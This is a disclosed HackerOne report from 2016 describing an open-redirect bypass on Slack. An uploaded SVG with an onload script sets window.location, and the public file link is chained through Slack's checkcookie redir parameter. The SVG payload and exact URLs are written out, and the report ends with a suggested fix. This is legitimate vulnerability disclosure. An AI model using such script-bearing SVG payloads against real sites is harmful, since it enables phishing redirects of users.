@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/104087
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/s1ck-sec
+ReportedTo:Slack(slack)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:22.05.2016 1:38:20
+
+Summary:
+
+this trick make all fixed open redirect links vulnerable again
+in this resolved report "https://hackerone.com/reports/2622"
+before fixing
+this link "https://slack.com/checkcookie?redir=http://www.example.com" redirect victim to "http://www.example.com"
+
+after fixing
+this link "https://slack.com/checkcookie?redir=http://www.example.com" only redirect to "https://www.slack.com/" or "https://subdomain.slack.com/"
+
+the trick
+=
+1- use slack account to upload .svg file contain this code
+<code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+ onload="window.location='http://www.example.com'"
+ xmlns="http://www.w3.org/2000/svg">
+</svg>
+</code>
+
+2-make public link for svg file "https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=7a6caed489"
+
+3- complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=7a6caed489"
+
+4-when user click this link will redirect to "http://www.example.com"
+
+in this accepted and Bounty report "https://hackerone.com/reports/2622"
+when user click this link "https://slack.com/checkcookie?redir=http://www.example.com" the result is redirect user to "http://www.example.com"
+in my report it's the same result
+
+you should stop execute svg files and display its's code like  HTML files
+
+ 
